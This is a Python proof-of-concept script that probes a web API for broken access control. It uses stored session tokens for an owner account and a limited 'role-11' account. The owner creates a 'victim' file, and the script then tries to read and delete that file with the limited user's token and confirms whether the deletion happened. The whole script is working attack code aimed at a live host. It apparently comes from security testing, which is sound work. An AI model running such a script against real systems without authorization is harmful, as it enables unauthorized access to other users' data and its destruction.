import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TR=open('/tmp/tok_R11-315').read().strip()
TB=open('/tmp/tok_B-230').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TR),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:8]
print("=== STEP 1: B(230, Owner) creates a file ===")
c,b=req('POST','/api/v1/attachments/html',
        {"html":f"<h1>ZX-R11-VICTIM-{tag}</h1>","type":"word",
         "attachableType":"AuditableEntity","attachableId":"97","fileName":f"zx-{tag}-R11VICTIM"},tok=TB)
print(f"  gen -> {c} {b[:140].replace(chr(10),' ')}")
if c!='200':
    raise SystemExit("could not create victim file")
aid=json.loads(b)['attachmentId']
c,b=req('GET',f'/api/v1/attachments/{aid}',tok=TB)
fid=json.loads(b)['attachments'][0]['file_id']
print(f"  attachment={aid} file_id={fid} (owned by 230)")
print("\n=== STEP 2: control - B reads own file ===")
c,b=req('GET',f'/api/v1/files/{fid}',tok=TB)
print(f"  B GET -> {c}")
print("\n=== STEP 3: role-11 LIMITED user tries to READ it ===")
c,b=req('GET',f'/api/v1/files/{fid}',tok=TR)
print(f"  R11 GET -> {c} {b[:160].replace(chr(10),' ')}")
print("\n=== STEP 4: role-11 LIMITED user tries to DELETE it ===")
c,b=req('DELETE',f'/api/v1/files/{fid}',tok=TR)
print(f"  R11 DELETE -> {c} {b[:220].replace(chr(10),' ')}")
print("\n=== STEP 5: did it actually delete? (B reads back) ===")
c,b=req('GET',f'/api/v1/files/{fid}',tok=TB)
print(f"  B GET -> {c} {b[:200].replace(chr(10),' ')}")
open('/tmp/r11_fid','w').write(str(fid))
